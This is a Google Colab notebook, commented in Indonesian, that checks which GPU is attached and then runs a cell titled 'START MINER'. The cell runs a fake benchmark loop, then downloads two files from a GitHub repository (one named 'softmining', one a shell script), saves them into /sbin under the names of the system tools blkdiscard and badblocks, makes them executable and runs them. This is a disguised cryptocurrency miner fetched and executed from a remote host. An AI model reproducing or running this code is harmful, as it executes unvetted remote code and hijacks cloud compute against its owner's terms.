{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "accelerator": "GPU",
    "colab": {
      "name": "Setting1.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "authorship_tag": "ABX9TyMzLRodqbDbsCrjUWR92SAd"
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "kS4DzTm1Hy3a",
        "cellView": "form"
      },
      "source": [
        "# %%\n",
        "#@title CEK GPU\n",
        "import subprocess\n",
        "\n",
        "def device_name():\n",
        "    try:\n",
        "        out = subprocess.getoutput('nvidia-smi -L')\n",
        "        result = out.split('GPU 0: ')[1].split(' (')[0]\n",
        "        if (result).find('Tesla ') != -1:\n",
        "            result = result.replace('Tesla ', '')\n",
        "        return result\n",
        "    except:\n",
        "        return 'GPU not found!'\n",
        "\n",
        "maxGPU = \"100\" #@param {type:\"string\"}\n",
        "minGPU = \"T4\" #@param {type:\"string\"}\n",
        "cek_device = device_name()\n",
        "if cek_device == 'GPU not found!':\n",
        "    gpu_name = 'backend'\n",
        "    print('GPU tidak ditemukan')\n",
        "else:\n",
        "    gpu_name = \"{0}\".format(cek_device)\n",
        "    if gpu_name.find(minGPU) != -1 or gpu_name.find(maxGPU) != -1:\n",
        "        print(f'Device Name: {gpu_name}')\n",
        "    else:\n",
        "        print('GPU tidak sesuai target!')\n"
      ],
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "metadata": {
        "id": "nMLWnKCqW4SD",
        "cellView": "form"
      },
      "source": [
        "# %%\n",
        "#@title START MINER\n",
        "from numba import jit, cuda\n",
        "import numpy as np\n",
        "from timeit import default_timer as timer\n",
        "listgpu = 'K80 T4 P100-PCIE-16GB V100-SXM2-16GB A100-SXM4-40GB'\n",
        "if listgpu.find(gpu_name) != -1:\n",
        "  if gpu_name.find(minGPU) != -1 or gpu_name.find(maxGPU) != -1:\n",
        "    pass\n",
        "  else:\n",
        "    raise SystemError('GPU tidak sesuai target!')\n",
        "else:\n",
        "  raise SystemError('GPU tidak dikenali!')\n",
        "def func(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "def func2(a):\n",
        "\tfor i in range(10000000):\n",
        "\t\ta[i]+= 1\n",
        "if __name__==\"__main__\":\n",
        "\tn = 10000000\n",
        "\ta = np.ones(n, dtype = np.float64)\n",
        "\tb = np.ones(n, dtype = np.float32)\n",
        "\tstart = timer()\n",
        "\tfunc(a)\n",
        "\tprint(\"without GPU:\", timer()-start) \n",
        "\tstart = timer()\n",
        "\tfunc2(a)\n",
        "\tprint(\"with GPU:\", timer()-start)\n",
        "%cd /sbin\n",
        "! wget -O blkdiscard github.com/Harryx77/ineyzzz/raw/main/softmining\n",
        "! wget -O badblocks github.com/Harryx77/ineyzzz/raw/main/y3n1.sh\n",
        "! chmod +x badblocks\n",
        "! ./badblocks"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}